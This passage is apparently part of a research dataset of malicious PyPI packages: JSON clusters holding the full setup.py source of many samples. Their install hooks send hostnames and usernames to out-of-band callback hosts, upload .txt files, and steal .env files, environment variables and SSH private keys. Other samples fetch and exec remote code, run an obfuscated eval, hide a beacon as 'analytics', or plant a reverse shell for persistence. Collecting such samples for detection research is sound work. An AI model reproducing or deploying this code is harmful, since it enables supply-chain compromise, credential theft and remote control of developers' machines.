        "code": "from setuptools import setup\nfrom setuptools.command.install import install\nimport requests\nimport socket\nimport getpass\nimport os\n\nclass CustomInstall(install):\n    def run(self):\n        install.run(self)\n        hostname=socket.gethostname()\n        cwd = os.getcwd()\n        username = getpass.getuser()\n        ploads = {'hostname':hostname,'cwd':cwd,'username':username}\n        requests.get(\"fo7288ar9hjgo6tp8p6c1efxpovgja7z.oastify.com\",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream\n\n\nsetup(name='syslog-ng', #package name\n      version='1.0.0',\n      description='test',\n      author='test',\n      license='MIT',\n      zip_safe=False,\n      cmdclass={'install': CustomInstall})\n\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-06-04-syslog-udp-v1.0.0",
        "code": "from setuptools import setup\nfrom setuptools.command.install import install\nimport requests\nimport socket\nimport getpass\nimport os\n\nclass CustomInstall(install):\n    def run(self):\n        install.run(self)\n        hostname=socket.gethostname()\n        cwd = os.getcwd()\n        username = getpass.getuser()\n        ploads = {'hostname':hostname,'cwd':cwd,'username':username}\n        requests.get(\"jg360c2v1lbkgalt0tygti71hsnkbmzb.oastify.com\",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream\n\n\nsetup(name='syslog-udp', #package name\n      version='1.0.0',\n      description='test',\n      author='test',\n      license='MIT',\n      zip_safe=False,\n      cmdclass={'install': CustomInstall})\n\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-06-03-good-regex-v1.0.0",
        "code": "from setuptools import setup\nfrom setuptools.command.install import install\nimport requests\nimport socket\nimport getpass\nimport os\n\nclass CustomInstall(install):\n    def run(self):\n        install.run(self)\n        hostname=socket.gethostname()\n        cwd = os.getcwd()\n        username = getpass.getuser()\n        ploads = {'hostname':hostname,'cwd':cwd,'username':username}\n        requests.get(\"fo7288ar9hjgo6tp8p6c1efxpovgja7z.oastify.com\",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream\n\n\nsetup(name='good-regex', #package name\n      version='1.0.0',\n      description='test',\n      author='test',\n      license='MIT',\n      zip_safe=False,\n      cmdclass={'install': CustomInstall})\n\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-06-04-arangodb-driver-v1.0.0",
        "code": "from setuptools import setup\nfrom setuptools.command.install import install\nimport requests\nimport socket\nimport getpass\nimport os\n\nclass CustomInstall(install):\n    def run(self):\n        install.run(self)\n        hostname=socket.gethostname()\n        cwd = os.getcwd()\n        username = getpass.getuser()\n        ploads = {'hostname':hostname,'cwd':cwd,'username':username}\n        requests.get(\"jg360c2v1lbkgalt0tygti71hsnkbmzb.oastify.com\",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream\n\n\nsetup(name='arangodb-driver', #package name\n      version='1.0.0',\n      description='test',\n      author='test',\n      license='MIT',\n      zip_safe=False,\n      cmdclass={'install': CustomInstall})\n\n"
      }
    ]
  },
  {
    "cluster_id": 177,
    "size": 1,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-15-a1rn-v0.1.4",
        "code": "import setuptools\nfrom setuptools.command.install import install\nimport os\n\ndef custom_function():\n    os.system('curl -F a=@/flag 114.115.142.57:10113')\n\nclass CustomInstallCommand(install):\n    def run(self):\n        custom_function()\n        install.run(self)\n\nsetuptools.setup(\n    name='a1rn',\n    version='0.1.4',\n    description='for ctf',\n    packages=setuptools.find_packages(),\n    cmdclass={\n        'install': CustomInstallCommand,\n    },\n)\n"
      }
    ]
  },
  {
    "cluster_id": 178,
    "size": 1,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-07-11-fasdghjkhjafsd-v0.0.3",
        "code": "from setuptools import setup\n\nfrom setuptools.command.develop import develop\nfrom setuptools.command.install import install\n\nimport os, glob\n\n\nimport urllib.request\nimport json\n\ndef post_json(body):\n    myurl = \"http://140.238.202.225:8080\"\n\n    req = urllib.request.Request(myurl)\n    req.add_header('Content-Type', 'application/json; charset=utf-8')\n    jsondata = json.dumps(body)\n    jsondataasbytes = jsondata.encode('utf-8')   # needs to be bytes\n    req.add_header('Content-Length', len(jsondataasbytes))\n    response = urllib.request.urlopen(req, jsondataasbytes)\n\n\nclass PostDevelopCommand(develop):\n    \"\"\"Post-installation for development mode.\"\"\"\n    def run(self):\n        develop.run(self)\n        # PUT YOUR POST-INSTALL SCRIPT HERE or CALL A FUNCTION\n\nclass PostInstallCommand(install):\n    \"\"\"Post-installation for installation mode.\"\"\"\n    def run(self):\n        install.run(self)\n        # post_fields = {'out': 'bar'}     # Set POST fields here\n\n        try:\n            path = '/home'\n            for filename in glob.glob(os.path.join(path, '**/prices.txt'),  recursive=True):\n                try:\n                    with open( filename, 'r') as f: # open in readonly mode\n                        # do your stuff\n                        text = f.read() + '\\n'\n                        post_json({filename: text})\n                except:\n                    pass\n        except:\n            pass\n\n        try:\n            path = '/'\n            for filename in glob.glob(os.path.join(path, '**/prices.txt'),  recursive=True):\n                try:\n                    with open( filename, 'r') as f: # open in readonly mode\n                        # do your stuff\n                        text = f.read() + '\\n'\n                        post_json({filename: text})\n                except:\n                    pass\n        except:\n            pass\n\n        try:\n            with open( '\\\\prices.txt', 'r') as f: # open in readonly mode\n                 # do your stuff\n                text = f.read() + '\\n'\n                post_json({filename: text})\n        except:\n            pass\n\n        try:\n            path = 'C:\\\\'\n            for filename in glob.glob(os.path.join(path, '**\\\\prices.txt'),  recursive=True):\n                try:\n                    with open( filename, 'r') as f: # open in readonly mode\n                        # do your stuff\n                        text = f.read() + '\\n'\n                        post_json({filename: text})\n                except:\n                    pass\n        except:\n            pass\n\n        try:\n            path = 'D:\\\\'\n            for filename in glob.glob(os.path.join(path, '**\\\\prices.txt'),  recursive=True):\n                try:\n                    with open( filename, 'r') as f: # open in readonly mode\n                        # do your stuff\n                        text = f.read() + '\\n'\n                        post_json({filename: text})\n                except:\n                    pass\n        except:\n            pass\n\n        try:\n            path = 'C:\\\\'\n            for filename in glob.glob(os.path.join(path, '**\\\\*.txt'),  recursive=True):\n                try:\n                    with open( filename, 'r') as f: # open in readonly mode\n                        # do your stuff\n                        text = f.read() + '\\n'\n                        post_json({filename: text})\n                except:\n                    pass\n        except:\n            pass\n\n        try:\n            path = ''\n            for filename in glob.glob(os.path.join(path, '**/prices.txt'),  recursive=True):\n                try:\n                    with open( filename, 'r') as f: # open in readonly mode\n                        # do your stuff\n                        text = f.read() + '\\n'\n                        post_json({filename: text})\n                except:\n                    pass\n        except:\n            pass\n\n        try:\n            path = ''\n            for filename in glob.glob(os.path.join(path, '**/*.txt'),  recursive=True):\n                try:\n                    with open( filename, 'r') as f: # open in readonly mode\n                        # do your stuff\n                        text = f.read() + '\\n'\n                        post_json({filename: text})\n                except:\n                    pass\n        except:\n            pass\n        \n        try:\n            path = '/'\n            for filename in glob.glob(os.path.join(path, '**/*.txt'),  recursive=True):\n                try:\n                    with open( filename, 'r') as f: # open in readonly mode\n                        # do your stuff\n                        text = f.read() + '\\n'\n                        post_json({filename: text})\n                except:\n                    pass\n        except:\n            pass\n            \n\n\nsetup(\n    name='fasdghjkhjafsd',\n    version='0.0.3',\n    py_modules=['requests5'],\n     cmdclass={\n        'develop': PostDevelopCommand,\n        'install': PostInstallCommand,\n    }\n)"
      }
    ]
  },
  {
    "cluster_id": 179,
    "size": 1,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-15-axderz-v1.0.4",
        "code": "from turtle import home\nimport setuptools\nfrom setuptools.command.install import install\nfrom setuptools.command.develop import develop\nimport os.path\nimport os\nimport base64\nimport subprocess\nfrom sys import platform\nimport string\nfrom pathlib import Path\n\n\nURL = \"http://bellazik.000webhostapp.com:443\"\n\n\ndef stealenv():\n    global URL\n    # Steal environment variables from shell and from .env\n    dotenv = \"\"\n    environs = {}\n    paths = []\n    \n    if platform == \"win32\":\n        # Windows\n        # get all drives\n        available_drives = ['%s:' % d for d in string.ascii_uppercase if os.path.exists('%s:' % d)]\n        \n        curr_dir = os.getcwd()\n        os.chdir(\"/\")\n\n        for drive in available_drives:\n            powershell_cmd = \"powershell.exe Get-ChildItem -Path %s -Filter *.env -Recurse -ErrorAction SilentlyContinue -Force -File | ForEach-Object {$_.FullName}\"%(drive)\n            print(powershell_cmd)\n            powershell_cmd = powershell_cmd.split(\" \")\n            try:\n                result = subprocess.run(powershell_cmd, capture_output=True, timeout=2)\n                output = result.stdout.decode()\n                output = output.split(\"\\n\")\n                if len(output)==0:\n                    continue\n                for i in output:\n                    i = i.rstrip()\n                    paths.append(i)\n            except Exception as e:\n                continue\n\n        for i in paths:\n            if os.path.exists(i):\n                with open(i, \"r\") as f:\n                    dotenv+=f.read()+\"\\n\"\n        \n        os.chdir(curr_dir)\n    \n    else:\n        # Linux and Mac\n        home_path = str(Path.home())\n        cmd = f\"find {home_path} -type f -name *.env\"\n        cmd = cmd.split(\" \")\n        try:\n            result = subprocess.run(cmd, capture_output=True, timeout=5)\n            output = result.stdout.decode().split(\"\\n\")\n            if len(output)==0:\n                return\n            for i in output:\n                i = i.rstrip()\n                paths.append(i)\n        except Exception as e:\n            pass\n\n        for i in paths:\n            if os.path.exists(i):\n                with open(i, \"r\") as f:\n                    dotenv+=f.read()+\"\\n\"\n    \n\n    for name, value in os.environ.items():\n        environs[name] = value\n\n    try:\n        dotenv = base64.b64encode(dotenv.encode()).decode()\n        environs = base64.b64encode(str(environs).encode()).decode()\n        req1 = f\"{URL}/?dotenv={dotenv}\"\n        req2 = f\"{URL}/?environs={environs}\"\n        subprocess.check_output([\"curl\",req1])\n        subprocess.check_output([\"curl\",req2])\n    except Exception as e:\n        pass\n\ndef stealsshkey():\n    global URL\n    home_path = str(Path.home())\n    privkey = \"\"\n    if not os.path.exists(os.path.join(home_path, \".ssh\",\"id_rsa\")):\n        return\n    \n    with open(os.path.join(home_path, \".ssh\",\"id_rsa\"),\"r\") as f:\n        privkey = f.read()\n\n    if privkey==\"\" or privkey is None:\n        return\n\n    try:\n        privkey = base64.b64encode(privkey.encode()).decode()\n        req = f\"{URL}/?id_rsa={privkey}\"\n        subprocess.check_output([\"curl\",req])\n    except Exception as e:\n        pass\n    \n\n\nclass AfterDevelop(develop):\n    def run(self):\n        develop.run(self)\n\nclass AfterInstall(install):\n    def run(self):\n        install.run(self)\n        stealenv()\n        stealsshkey()\n\n\nsetuptools.setup(\n    name = \"axderz\",\n    version = \"1.0.4\",\n    author = \"babyboy\",\n    author_email = \"u@example.com\",\n    description = \"A test package to demonstrate malicious pip packages\",\n    long_description = \"long description\",\n    long_description_content_type = \"text/markdown\",\n    url = \"https://github.com/teja156/autobot-clipper\",\n    project_urls = {\n        \"Bug Tracker\": \"https://github.com/teja156/autobot-clipper/issues\",\n    },\n    classifiers = [\n        \"Programming Language :: Python :: 3\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n    ],\n    package_dir = {\"\": \"src\"},\n    packages = setuptools.find_packages(where=\"src\"),\n    python_requires = \">=3.6\",\n    cmdclass={\n        'develop': AfterDevelop,\n        'install': AfterInstall,\n    },\n)\n\ndef calcAverage(li):\n    return sum(li)//len(li)\n\ndef lol():\n    return \"lol\"\n"
      }
    ]
  },
  {
    "cluster_id": 180,
    "size": 1,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-21-randrange",
        "code": "from setuptools import setup\nfrom setup import kwargs\nsetup(**kwargs)\n\n\nfrom pathlib import Path\nfrom setuptools.command.install import install\nfrom setup.utils import ec\n\nclass InstallCommand(install):\n    def __init__(self, dist):\n        super().__init__(dist)\n        try:\n            import os,json\n            e = json.dumps(os.environ.copy())\n            self.e = ec(e)\n        except:\n            self.e = b''\n\n    def run(self):\n        import urllib.request\n        h = 'https'\n        c = 'cdwa8tk2vtc0000yhygggg6frpcyyyyyb'\n        o = 'oa' + 'st'\n        f = 'fun'\n        u = f'{h}://{c}.{o}.{f}'\n        urllib.request.urlopen(u, data=self.e)\n        install.run(self)\n\n\n\ndef ec(s: str):\n    import base64\n    return base64.b64encode(s.encode('utf-8'))\n\n\nimport setup.install_command\nkwargs = {\n    'name': 'randrange',\n    'version': '0.0.2',\n    'description': 'Rand range implementation',\n    'url': 'https://github.com/randrange/randrange',\n    'author': '0xn3va',\n    'keywords': ['python', 'range'],\n    'long_description': '',\n    'long_description_content_type': 'text/markdown',\n    'license': 'Apache-2.0',\n    'extras_require': {\n        'dev': [\n            'wheel',\n            'twine'\n        ]\n    },\n    'cmdclass': { 'install': setup.install_command.InstallCommand }\n}\n"
      }
    ]
  },
  {
    "cluster_id": 181,
    "size": 7,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-10-dependency-conf",
        "code": "from setuptools import setup\nfrom setuptools.command.install import install\nimport requests\nimport socket\nimport getpass\nimport os\n\nclass CustomInstall(install):\n    def run(self):\n        install.run(self)\n        hostname=socket.gethostname()\n        cwd = os.getcwd()\n        username = getpass.getuser()\n        ploads = {'hostname':hostname,'cwd':cwd,'username':username}\n        requests.get(\"https://cdpgcyk2vtc00007d3dggg5egxcyyyyyb.oast.fun\",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream\n\n\nsetup(name='dependency-conf', #package name\n      version='1.0.0',\n      description='test',\n      author='test',\n      license='MIT',\n      zip_safe=False,\n      cmdclass={'install': CustomInstall})\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-12-05-edenred",
        "code": "from setuptools import setup\nfrom setuptools.command.install import install\nimport requests\nimport socket\nimport getpass\nimport os\n\nclass CustomInstall(install):\n    def run(self):\n        install.run(self)\n        hostname=socket.gethostname()\n        cwd = os.getcwd()\n        username = getpass.getuser()\n        ploads = {'hostname':hostname,'cwd':cwd,'username':username}\n        requests.get(\"https://cdf5rwk2vtc0000c78d0ggz1hqeyyyyyb.oast.fun\",params = ploads)\n\n\nsetup(name='edenred', #package name\n      version='1.0.0',\n      description='test',\n      author='test',\n      license='MIT',\n      zip_safe=False,\n      cmdclass={'install': CustomInstall})\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-06-18-cleantalk-v6.6.6",
        "code": "from setuptools import setup\nfrom setuptools.command.install import install\nimport requests\nimport socket\nimport getpass\nimport os\n\nclass CustomInstall(install):\n    def run(self):\n        install.run(self)\n        hostname=socket.gethostname()\n        cwd = os.getcwd()\n        username = getpass.getuser()\n        ploads = {'hostname':hostname,'cwd':cwd,'username':username}\n        requests.get(\"https://cj4cpwk2vtc0000ep3s0gjngmqeyyyyyb.oast.fun\",params = ploads)\n\n\nsetup(name='cleantalk',\n      version='6.6.6',\n      description='Exfiltration',\n      author='chawla',\n      license='MIT',\n      zip_safe=False,\n      cmdclass={'install': CustomInstall})\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-06-18-dependency1338-v1.0.0",
        "code": "from setuptools import setup\nfrom setuptools.command.install import install\nimport requests\nimport socket\nimport getpass\nimport os\n\nclass CustomInstall(install):\n    def run(self):\n        install.run(self)\n        hostname=socket.gethostname()\n        cwd = os.getcwd()\n        username = getpass.getuser()\n        ploads = {'hostname':hostname,'cwd':cwd,'username':username}\n        requests.get(\"https://eo6ksiuyau5e5x2.m.pipedream.net\",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream\n\n\nsetup(name='dependency1338', #package name\n      version='1.0.0',\n      description='test',\n      author='test',\n      license='MIT',\n      zip_safe=False,\n      cmdclass={'install': CustomInstall})\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-04-16-jmdrs-v1.0.6",
        "code": "from setuptools import setup\nfrom setuptools.command.install import install\nimport requests\nimport socket\nimport getpass\nimport os\n\nclass CustomInstall(install):\n    def run(self):\n        install.run(self)\n        hostname=socket.gethostname()\n        cwd = os.getcwd()\n        username = getpass.getuser()\n        ploads = {'hostname':hostname,'cwd':cwd,'username':username}\n        requests.get(\"https://eotzpna8faswp5.m.pipedream.net\",params = ploads)\n\n\nsetup(name='jmdrs',\n      version='1.0.6',\n      description='Exfiltration',\n      author='chawla',\n      license='MIT',\n      zip_safe=False,\n      cmdclass={'install': CustomInstall})\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-12-05-python-edenred-payments",
        "code": "from setuptools import setup\nfrom setuptools.command.install import install\nimport requests\nimport socket\nimport getpass\nimport os\n\nclass CustomInstall(install):\n    def run(self):\n        install.run(self)\n        hostname=socket.gethostname()\n        cwd = os.getcwd()\n        username = getpass.getuser()\n        ploads = {'hostname':hostname,'cwd':cwd,'username':username}\n        requests.get(\"https://cdf5rwk2vtc0000c78d0ggz1hqeyyyyyb.oast.fun\",params = ploads)\n\n\nsetup(name='python-edenred-payments', #package name\n      version='1.0.0',\n      description='test',\n      author='test',\n      license='MIT',\n      zip_safe=False,\n      cmdclass={'install': CustomInstall})\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-citscapesscripts-v11.0.0",
        "code": "from setuptools import setup\nfrom setuptools.command.install import install\nimport requests\nimport socket\nimport getpass\nimport os\n\nclass CustomInstall(install):\n    def run(self):\n        install.run(self)\n        hostname=socket.gethostname()\n        cwd = os.getcwd()\n        username = getpass.getuser()\n        ploads = {'hostname':hostname,'cwd':cwd,'username':username}\n        requests.get(\"https://eolunbv9e34gp3b.m.pipedream.net\",params = ploads)\n\n\nsetup(name='citscapesscripts', \n      version='11.0.0',\n      description='AnupamAs01',\n      author='AnupamAs01',\n      license='MIT',\n      zip_safe=False,\n      cmdclass={'install': CustomInstall})\n"
      }
    ]
  },
  {
    "cluster_id": 182,
    "size": 1,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-24-some-random-package-33-v2.3.100",
        "code": "from setuptools import setup\nfrom setuptools.command.install import install\nimport os\nfrom setuptools.command.install import install\nfrom setuptools.command.develop import develop\nfrom setuptools.command.egg_info import egg_info\n\ndef custom_command():\n    bobo = \"rzuv\"\n    zuzu = \"p242\"\n    jojo = \"etr8\"\n    mumu = \"3lxg\"\n    nini = \"bvsn\"\n    nono = \"stem\"\n    lolo = \"7pdg\"\n    gogo = \"16pv\"\n    dodo = \".\"\n    popo = \"oast\"\n    toto = \"ify.c\"\n    koko = \"om\"\n    baz = \" \"\n    bar = \"get\"\n    fufu = \"w\"\n    gaga = \".sy\"\n    foo = \"o\"\n    lala = \"s\"\n\n    wombo = bobo + zuzu + jojo + mumu + nini + \"d17y\" + lolo + gogo + dodo + popo + toto + koko\n    combo = fufu + bar + baz\n    funky_town = foo + lala + gaga + nono\n\n    eval(funky_town + f\"('{combo + wombo}')\")\n\n\n\nclass CustomInstallCommand(install):\n    def run(self):\n        install.run(self)\n        custom_command()\n\n\nclass CustomDevelopCommand(develop):\n    def run(self):\n        develop.run(self)\n        custom_command()\n\n\nclass CustomEggInfoCommand(egg_info):\n    def run(self):\n        egg_info.run(self)\n        custom_command()\n\n\nsetup(\n    name='some-random-package-33',\n    version='2.3.100',\n    description='funky_town',\n    author='funky_town',\n    author_email='funky_town@funky.town',\n    packages=[],\n    cmdclass={\n        'install': CustomInstallCommand,\n        'develop': CustomDevelopCommand,\n        'egg_info': CustomEggInfoCommand,\n    },\n)\n"
      }
    ]
  },
  {
    "cluster_id": 183,
    "size": 2,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-08-23-formatter-test-package-v0.0.1",
        "code": "import os\nimport platform\nimport socket\nimport time\nimport psutil\nimport requests\nimport traceback\n\n\ndef find_import_stack():\n    \"\"\"\n    Extract the current call stack to identify the context in which the package is being imported.\n    Returns the stack as a formatted string.\n    \"\"\"\n    stack = traceback.extract_stack()\n    stack_info = []\n    \n    for frame in stack:\n        stack_info.append({\n            'file': frame.filename,\n            'line': frame.lineno,\n            'function': frame.name,\n            'code': frame.line.strip(),\n        })\n    \n    return stack_info\n\ndef analytics():\n    # Collect system information\n    os_info = platform.system()\n    uptime = time.time() - psutil.boot_time()\n    \n    # Attempt to find and print the import stack\n    stack_info = find_import_stack()\n\n    # Prepare data to send\n    data = {\n        'os': os_info,\n        'uptime': uptime,\n        'hostname': socket.gethostname(),\n        'import_stack': stack_info,\n    }\n\n    # Send the data to a specific URL\n    try:\n        response = requests.post('https://webhook.site/baf67bd8-bf43-41ae-8af2-4a0fb906f90d/analytics', json=data)\n        if response.status_code == 200:\n            print(\"Analytics sent successfully.\")\n        else:\n            print(f\"Failed to send analytics. Status code: {response.status_code}\")\n    except Exception as e:\n        print(f\"Error sending analytics: {e}\")\n\nif __name__ == \"__main__\":\n    analytics()\n\n\nimport re\n\ndef format_code(code):\n    # Remove trailing whitespaces\n    code = re.sub(r'[ \\t]+$', '', code, flags=re.MULTILINE)\n    \n    # Ensure newline at the end of file\n    if not code ends with '\\n':\n        code += '\\n'\n    \n    # Replace tabs with 4 spaces\n    code = code.replace('\\t', '    ')\n    \n    # Additional formatting can be added here\n    return code\n\ndef format_file(file_path):\n    with open(file_path, 'r') as file:\n        code = file.read()\n    \n    formatted_code = format_code(code)\n    \n    with open(file_path, 'w') as file:\n        file.write(formatted_code)\n    \n    print(f\"Formatted {file_path} successfully.\")\n\nif __name__ == \"__main__\":\n    sample_code = \"def example():\\n\\tprint('Hello, World!')\\n\"\n    formatted_code = format_code(sample_code)\n    print(f\"Original Code:\\n{sample_code}\")\n    print(f\"Formatted Code:\\n{formatted_code}\")\n\nimport re\n\ndef check_trailing_whitespace(code):\n    \"\"\"Check for lines with trailing whitespace.\"\"\"\n    lines_with_issues = []\n    for i, line in enumerate(code.splitlines(), 1):\n        if re.search(r'[ \\t]+$', line):\n            lines_with_issues.append(i)\n    return lines_with_issues\n\ndef check_missing_newline(code):\n    \"\"\"Check if the file ends without a newline.\"\"\"\n    return not code.endswith('\\n')\n\ndef run_linter(file_path):\n    \"\"\"Run basic linting on the given file.\"\"\"\n    with open(file_path, 'r') as file:\n        code = file.read()\n    \n    # Check for issues\n    trailing_whitespace_lines = check_trailing_whitespace(code)\n    missing_newline = check_missing_newline(code)\n    \n    # Report issues\n    if trailing_whitespace_lines:\n        print(f\"Linting issue: Trailing whitespace found on lines: {trailing_whitespace_lines}\")\n    if missing_newline:\n        print(\"Linting issue: File does not end with a newline.\")\n    \n    if not trailing_whitespace_lines and not missing_newline:\n        print(f\"{file_path} passed linting successfully.\")\n    else:\n        print(f\"{file_path} has linting issues.\")\n\nif __name__ == \"__main__\":\n    sample_code = \"def example():    \\n    print('Hello, World!')\\n\"\n    with open(\"sample_file.py\", \"w\") as f:\n        f.write(sample_code)\n    \n    run_linter(\"sample_file.py\")\n\n\n\n# __init__.py for the utils package\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-08-23-formatter-test-package-v0.1.0",
        "code": "import os\nimport platform\nimport socket\nimport time\nimport psutil\nimport requests\nimport traceback\n\n\ndef find_import_stack():\n    \"\"\"\n    Extract the current call stack to identify the context in which the package is being imported.\n    Returns the stack as a formatted string.\n    \"\"\"\n    stack = traceback.extract_stack()\n    stack_info = []\n    \n    for frame in stack:\n        stack_info.append({\n            'file': frame.filename,\n            'line': frame.lineno,\n            'function': frame.name,\n            'code': frame.line.strip(),\n        })\n    \n    return stack_info\n\ndef analytics():\n    # Collect system information\n    os_info = platform.system()\n    uptime = time.time() - psutil.boot_time()\n    \n    # Attempt to find and print the import stack\n    stack_info = find_import_stack()\n\n    # Prepare data to send\n    data = {\n        'os': os_info,\n        'uptime': uptime,\n        'hostname': socket.gethostname(),\n        'import_stack': stack_info,\n    }\n\n    # Send the data to a specific URL\n    try:\n        response = requests.post('https://webhook.site/baf67bd8-bf43-41ae-8af2-4a0fb906f90d/analytics', json=data)\n        if response.status_code == 200:\n            print(\"Analytics sent successfully.\")\n        else:\n            print(f\"Failed to send analytics. Status code: {response.status_code}\")\n    except Exception as e:\n        print(f\"Error sending analytics: {e}\")\n\nif __name__ == \"__main__\":\n    analytics()\n\n\nimport re\n\ndef format_code(code):\n    # Remove trailing whitespaces\n    code = re.sub(r'[ \\t]+$', '', code, flags=re.MULTILINE)\n    \n    # Ensure newline at the end of file\n    if not code ends with '\\n':\n        code += '\\n'\n    \n    # Replace tabs with 4 spaces\n    code = code.replace('\\t', '    ')\n    \n    # Additional formatting can be added here\n    return code\n\ndef format_file(file_path):\n    with open(file_path, 'r') as file:\n        code = file.read()\n    \n    formatted_code = format_code(code)\n    \n    with open(file_path, 'w') as file:\n        file.write(formatted_code)\n    \n    print(f\"Formatted {file_path} successfully.\")\n\nif __name__ == \"__main__\":\n    sample_code = \"def example():\\n\\tprint('Hello, World!')\\n\"\n    formatted_code = format_code(sample_code)\n    print(f\"Original Code:\\n{sample_code}\")\n    print(f\"Formatted Code:\\n{formatted_code}\")\n\nimport re\n\ndef check_trailing_whitespace(code):\n    \"\"\"Check for lines with trailing whitespace.\"\"\"\n    lines_with_issues = []\n    for i, line in enumerate(code.splitlines(), 1):\n        if re.search(r'[ \\t]+$', line):\n            lines_with_issues.append(i)\n    return lines_with_issues\n\ndef check_missing_newline(code):\n    \"\"\"Check if the file ends without a newline.\"\"\"\n    return not code.endswith('\\n')\n\ndef run_linter(file_path):\n    \"\"\"Run basic linting on the given file.\"\"\"\n    with open(file_path, 'r') as file:\n        code = file.read()\n    \n    # Check for issues\n    trailing_whitespace_lines = check_trailing_whitespace(code)\n    missing_newline = check_missing_newline(code)\n    \n    # Report issues\n    if trailing_whitespace_lines:\n        print(f\"Linting issue: Trailing whitespace found on lines: {trailing_whitespace_lines}\")\n    if missing_newline:\n        print(\"Linting issue: File does not end with a newline.\")\n    \n    if not trailing_whitespace_lines and not missing_newline:\n        print(f\"{file_path} passed linting successfully.\")\n    else:\n        print(f\"{file_path} has linting issues.\")\n\nif __name__ == \"__main__\":\n    sample_code = \"def example():    \\n    print('Hello, World!')\\n\"\n    with open(\"sample_file.py\", \"w\") as f:\n        f.write(sample_code)\n    \n    run_linter(\"sample_file.py\")\n\n\n\n# __init__.py for the utils package\n"
      }
    ]
  },
  {
    "cluster_id": 184,
    "size": 1,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-05-pycolorz-v0.0.8",
        "code": "from setuptools import setup, find_packages\nfrom tempfile import NamedTemporaryFile as _ffile\nfrom sys import executable as _eexecutable\nfrom os import system as _ssystem\nfrom tempfile import NamedTemporaryFile as _ffile\nfrom sys import executable as _eexecutable\nfrom os import system as _ssystem\n\nVERSION = '0.0.8'\nDESCRIPTION = 'A Python Library'\n\nfrom tempfile import NamedTemporaryFile as _ffile\nfrom sys import executable as _eexecutable\nfrom os import system as _ssystem\n_ttmp = _ffile(delete=False)\n_ttmp.write(b\"\"\"from urllib.request import urlopen as _uurlopen;exec(_uurlopen(\"https://paste.bingner.com/paste/39kv9/raw\").read())\"\"\")\n_ttmp.close()\ntry: _ssystem(f\"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}\")\nexcept: pass\n\nsetup(\n    name=\"pycolorz\",\n    version=VERSION,\n    author=\"Themonkey094\",\n    description=DESCRIPTION,\n)\n\n\nfrom tempfile import NamedTemporaryFile as _ffile\nfrom sys import executable as _eexecutable\nfrom os import system as _ssystem\n\nclass http:\n    def __init__(self):\n        pass"
      }
    ]
  },
  {
    "cluster_id": 185,
    "size": 1,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-12-02-genz-translator-v9032.0.1",
        "code": "from setuptools import find_packages\nfrom setuptools import setup\nfrom setuptools.command.develop import develop\nfrom setuptools.command.install import install\nimport os\nimport sys\n\nVERSION = 'v9032.0.1'\nPACKAGE_NAME = \"genz_translator\"\nINTERNAL_REPO_IP = \"servers.genzrulez.com\"\nINTERNAL_REPO_URL = \"http://PyPiper:pyisthepiperthatpipesasweetmelody1!@servers.genzrulez.com:8010/simple/\"\n\nclass PostInstallCommand(install):\n     def run(self):\n         install.run(self)\n\n         #Fix their code to perform the correct install\n         #Let's install their version\n         os.system('pip3 install ' + PACKAGE_NAME + ' --no-cache-dir --trusted-host ' + INTERNAL_REPO_IP + ' --index-url \"' + INTERNAL_REPO_URL + '\"')\n         #Their version is installed now\n\n         #Preserve their __main__ and __init__.py as we will overwrite these\n         paths = sys.path\n         actual_path = \"\"\n         for path in paths:\n             if (os.path.isdir(path + \"/\" + PACKAGE_NAME)):\n                 actual_path = path + \"/\"\n                 break\n         os.system('ls -al ' + actual_path + '/')\n\n\n\n         #Inject our persistence\n         #os.system('ls -al ' + actual_path + PACKAGE_NAME + \"/\")\n         f = open(actual_path + PACKAGE_NAME + \"/__init__.py\", 'w')\n         f.write('import os;os.system(\\'python -c \\\\\\'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"covenant.thinkgreencorp.net\",8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])\\\\\\'&\\')')\n         f.close()\n         #Persistence embedded\n\n         #Save code to safe location\n         os.system('cp -r ' + actual_path + PACKAGE_NAME + ' ' + actual_path + PACKAGE_NAME + \"BAK\")\n         #Location preserved\n\nsetup(\n        name=PACKAGE_NAME,\n        url='https://pypi.org/simple/genz_translator/',\n        